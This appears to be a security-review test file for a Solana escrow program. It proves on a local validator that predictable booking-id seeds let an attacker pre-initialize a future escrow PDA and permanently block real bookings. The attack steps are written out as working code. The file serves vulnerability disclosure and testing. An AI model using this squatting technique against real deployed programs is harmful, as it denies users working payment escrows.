/**
 * CASI Escrow — PDA-squatting / front-running DoS (Fable, independent
 * adversarial pass, 2026-08-28).
 *
 * This is a NEW hypothesis, not a re-test of anything in
 * docs/fable-security-review-2026-08-10.md or tests/security-findings.ts.
 * Those files already prove (and accept as by-design) that
 * `initialize_escrow`'s `streamer` field takes an arbitrary UncheckedAccount
 * with no signature — i.e. anyone can open a Pending escrow "against" any
 * streamer pubkey. This file is about a different, narrower thing: the
 * *seed* used for the escrow PDA, `escrow_id`, is NOT random or secret in
 * this app's actual usage — it's `sha256(String(bookings.id))`, where
 * `bookings.id` is a plain Postgres bigint auto-increment column that the
 * app hands straight back to the client in the JSON response of
 * `POST /api/bookings/create-solana` (see that route's `booking_id` field,
 * and `uuidToBytes()` / `deriveEscrowPda()` in src/lib/casi-escrow.ts which
 * both client and server call to arrive at the same PDA).
 *
 * Because:
 *   (1) `escrow_id` does not include the viewer or streamer in the PDA
 *       seed — only `[ESCROW_SEED, escrow_id]` — and
 *   (2) `initialize_escrow` uses Anchor's `init` (not `init_if_needed`),
 *       so whichever transaction lands FIRST permanently owns that PDA,
 *       and
 *   (3) `escrow_id` in production is a deterministic hash of a small,
 *       sequential, publicly-returned integer,
 *
 * ...a third party who has never seen a specific booking can predict its
 * future `escrow_id` (booking ids are sequential — an attacker who creates
 * one booking of their own learns roughly where the counter is, then just
 * increments) and pre-emptively call `initialize_escrow` themselves against
 * that exact PDA, weeks or months before the real booking is ever created.
 * When the real viewer's booking later gets that same sequential id and
 * their wallet tries the real `initialize_escrow`, it fails on-chain with
 * "already in use" — the booking can NEVER get a working on-chain escrow,
 * permanently. This does not steal funds (the attacker only spends their
 * own SOL/USDC), but it is a very cheap, very durable denial-of-service on
 * the entire Solana payment rail: one attacker, a handful of transactions,
 * can pre-squat a wide contiguous range of future booking ids.
 *
 * This file proves the on-chain half: once escrow_id X is initialized by
 * ANYONE, the true intended participants can never construct a working
 * escrow at that PDA again, no matter who they are or what they intend.
 * The off-chain half (booking ids being sequential + returned to the
 * client) is documented above and verified by reading
 * src/app/api/bookings/create-solana/route.ts + src/lib/casi-escrow.ts
 * directly (both cited by path/line in the report).
 *
 * Run with ./scripts/test-real-deploy.sh --grep "PDA squatting"
 */

import * as anchor from "@coral-xyz/anchor";
import BN from "bn.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createMint,
  getAssociatedTokenAddressSync,
  getOrCreateAssociatedTokenAccount,
  mintTo,
} from "@solana/spl-token";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
} from "@solana/web3.js";
import { expect } from "chai";
import { createHash } from "crypto";

const ESCROW_SEED = Buffer.from("casi-escrow");
const CONFIG_SEED = Buffer.from("casi-config");
const REGISTRY_SEED = Buffer.from("casi-registry");
const USDC_DECIMALS = 6;
const TYPE_FLASH = 0;
const TYPE_BEAM = 1;

/**
 * Exact mirror of `uuidToBytes()` in src/lib/casi-escrow.ts:
 *   export function uuidToBytes(id) { return sha256(String(id)); }
 * SHA-256 is SHA-256 regardless of library (@noble/hashes here vs. Node's
 * builtin crypto in the test) — same input bytes produce the same digest.
 * This is what both the browser client and the create-solana server route
 * compute from a plain `bookings.id` integer to get the 32-byte PDA seed.
 */
function bookingIdToEscrowId(bookingId: number | string): number[] {
  return Array.from(createHash("sha256").update(String(bookingId)).digest());
}

function derivePda(escrowId: number[], programId: PublicKey): PublicKey {
  const [pda] = PublicKey.findProgramAddressSync(
    [ESCROW_SEED, Buffer.from(escrowId)],
    programId,
  );
  return pda;
}

describe("casi-escrow — PDA squatting / front-running DoS (independent review, 2026-08-28)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const program: any = anchor.workspace.CasiEscrow;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const payer: Keypair = ((provider.wallet as any).payer) as Keypair;

  let usdcMint: PublicKey;
  let configPda: PublicKey;

  async function airdrop(pubkey: PublicKey, sol = 2) {
    const sig = await provider.connection.requestAirdrop(pubkey, sol * LAMPORTS_PER_SOL);
    await provider.connection.confirmTransaction(sig, "confirmed");
  }

  before(async function () {
    this.timeout(30_000);
    [configPda] = PublicKey.findProgramAddressSync([CONFIG_SEED], program.programId);

    const existing = await provider.connection.getAccountInfo(configPda);
    if (existing) {
      const cfg = await program.account.globalConfig.fetch(configPda);
      usdcMint = cfg.acceptedMint as PublicKey;
      return;
    }

    usdcMint = await createMint(
      provider.connection, payer, payer.publicKey, null, USDC_DECIMALS,
    );
    const progInfo = await provider.connection.getAccountInfo(program.programId);
    if (!progInfo) throw new Error("casi_escrow program not found on localnet");
    const programDataAddress = new PublicKey(progInfo.data.slice(4, 36));
    await program.methods
      .initializeConfig(new BN(0), new BN(0))
      .accounts({
        initializer: payer.publicKey,
        config: configPda,
        acceptedMint: usdcMint,
        programData: programDataAddress,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([payer])
      .rpc();
  });

  async function registerStreamer(streamer: Keypair) {
    const [registryPda] = PublicKey.findProgramAddressSync(
      [REGISTRY_SEED, streamer.publicKey.toBuffer()],
      program.programId,
    );
    return program.methods
      .registerStreamer()
      .accounts({
        streamer: streamer.publicKey,
        registry: registryPda,
        systemProgram: SystemProgram.programId,
      })
      .signers([streamer])
      .rpc();
  }

  async function fundedAta(owner: Keypair, amount: bigint): Promise<PublicKey> {
    const ata = (
      await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, owner.publicKey)
    ).address;
    if (amount > 0n) {
      await mintTo(provider.connection, payer, usdcMint, ata, payer, amount);
    }
    return ata;
  }

  it('PDA squatting: a third party who only knows a future sequential "booking id" can permanently deny that booking a working on-chain escrow — before the real booking is even created', async () => {
    // A booking id far in the future relative to whatever this validator's
    // test suite has created so far — stands in for "an id the attacker
    // guessed/enumerated ahead of time by watching POST /api/bookings/
    // create-solana's booking_id response and incrementing." No knowledge
    // of the real viewer, real streamer, or DB state is required.
    const futureBookingId = 7_340_001;
    const escrowId = bookingIdToEscrowId(futureBookingId);
    const escrowPda = derivePda(escrowId, program.programId);
    const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);

    // --- Step 1: attacker squats the PDA, weeks before booking #7340001
    // is ever created by a real user. Flash type is deliberately chosen —
    // unlike Beam, a Flash Pending escrow is NEVER reachable by the
    // permissionless cancel_stale_pending crank (see lib.rs's
    // cancel_stale_pending: `has_one escrow_type == Beam` gate), so once
    // squatted this way it stays squatted until the attacker themselves
    // chooses to release it.
    const attacker = Keypair.generate();
    await airdrop(attacker.publicKey);
    const attackerAta = await fundedAta(attacker, 1n);
    // Post-fix (see docs/fable-security-review-2026-08-10.md Finding 4,
    // closed same session as this test's registration additions), the
    // target must be a REGISTERED streamer — the attacker can no longer
    // squat against an arbitrary junk pubkey. This doesn't defeat the DoS:
    // it just means the realistic threat model is squatting a REAL,
    // already-registered streamer's future booking slot, which is exactly
    // what this simulates.
    const victimStreamer = Keypair.generate();
    await airdrop(victimStreamer.publicKey);
    await registerStreamer(victimStreamer);

    await program.methods
      .initializeEscrow(escrowId, new BN(1), new BN(0), TYPE_FLASH)
      .accounts({
        viewer: attacker.publicKey,
        streamer: victimStreamer.publicKey,
        config: configPda,
        escrowState: escrowPda,
        vault,
        viewerAta: attackerAta,
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const squatted = await program.account.escrowState.fetch(escrowPda);
    expect(squatted.viewer.toBase58()).to.equal(attacker.publicKey.toBase58());
    expect(squatted.status).to.deep.equal({ pending: {} });

    // --- Step 2: weeks later, booking #7340001 is a REAL booking. The real
    // viewer and real streamer have no idea the PDA is already taken — they
    // derive the exact same escrow_id via the exact same
    // sha256(String(booking.id)) the app always uses, because that's the
    // only derivation that exists. Their legitimate initialize_escrow now
    // fails, permanently, for a reason entirely outside their control.
    const realViewer = Keypair.generate();
    const realStreamer = Keypair.generate();
    await airdrop(realViewer.publicKey);
    await airdrop(realStreamer.publicKey);
    await registerStreamer(realStreamer);
    const realViewerAta = await fundedAta(realViewer, 5_000_000n); // 5 real USDC

    let realBookingFailed = false;
    let failureMessage = "";
    try {
      await program.methods
        .initializeEscrow(escrowId, new BN(5_000_000), new BN(0), TYPE_FLASH)
        .accounts({
          viewer: realViewer.publicKey,
          streamer: realStreamer.publicKey,
          config: configPda,
          escrowState: escrowPda, // same PDA — same escrow_id, no other seed exists
          vault, // same vault — already owned by the attacker's escrow_state authority
          viewerAta: realViewerAta,
          usdcMint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([realViewer])
        .rpc();
    } catch (err) {
      realBookingFailed = true;
      failureMessage = err instanceof Error ? err.message : String(err);
    }

    expect(realBookingFailed, "the real booking's initialize_escrow must fail — the PDA is squatted").to.equal(true);
    // Anchor's `init` constraint surfaces this as the account already being
    // in use — confirms the failure is specifically PDA collision, not some
    // unrelated error.
    expect(failureMessage.toLowerCase()).to.satisfy(
      (m: string) => m.includes("already in use") || m.includes("0x0") || m.includes("already been initialized") || m.includes("custom program error"),
      `expected an "account already in use" style failure, got: ${failureMessage}`,
    );

    // The real viewer's funds never moved — initialize_escrow's transfer and
    // its account-init happen in the same atomic transaction, so the failed
    // `init` means the whole tx (including the token transfer) reverted.
    // No fund loss, but booking #7340001 can NEVER get a valid on-chain
    // escrow at its "correct" address again — the DoS is permanent for that
    // specific booking id, at a cost to the attacker of one tx fee + 1
    // micro-USDC (which they can even reclaim later via deny_flash/
    // approve_flash while keeping the PDA available to re-squat instantly).
    const stillSquatted = await program.account.escrowState.fetch(escrowPda);
    expect(stillSquatted.viewer.toBase58()).to.equal(attacker.publicKey.toBase58());
    expect(stillSquatted.status).to.deep.equal({ pending: {} });
  });

  it("confirms the squat is NOT bounded by the 7-day stale-pending timeout when the attacker chooses Flash type (cancel_stale_pending only accepts Beam)", async () => {
    const bookingId = 7_340_002;
    const escrowId = bookingIdToEscrowId(bookingId);
    const escrowPda = derivePda(escrowId, program.programId);
    const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);

    const attacker = Keypair.generate();
    await airdrop(attacker.publicKey);
    const attackerAta = await fundedAta(attacker, 1n);
    const someStreamer = Keypair.generate();
    await airdrop(someStreamer.publicKey);
    await registerStreamer(someStreamer);

    await program.methods
      .initializeEscrow(escrowId, new BN(1), new BN(0), TYPE_FLASH)
      .accounts({
        viewer: attacker.publicKey,
        streamer: someStreamer.publicKey,
        config: configPda,
        escrowState: escrowPda,
        vault,
        viewerAta: attackerAta,
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const cranker = Keypair.generate();
    await airdrop(cranker.publicKey);
    const viewerAta = getAssociatedTokenAddressSync(usdcMint, attacker.publicKey);

    let rejected = false;
    let msg = "";
    try {
      await program.methods
        .cancelStalePending(escrowId)
        .accounts({
          cranker: cranker.publicKey,
          viewer: attacker.publicKey,
          escrowState: escrowPda,
          vault,
          viewerAta,
          usdcMint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([cranker])
        .rpc();
    } catch (err) {
      rejected = true;
      msg = err instanceof Error ? err.message : String(err);
    }

    expect(rejected).to.equal(true);
    expect(msg).to.include("WrongEscrowType");
    // No permissionless rescue path exists for a Flash-type squat, at any
    // elapsed time — only the squatter's own signature (approve_flash /
    // deny_flash) can ever free this PDA.
  });
});
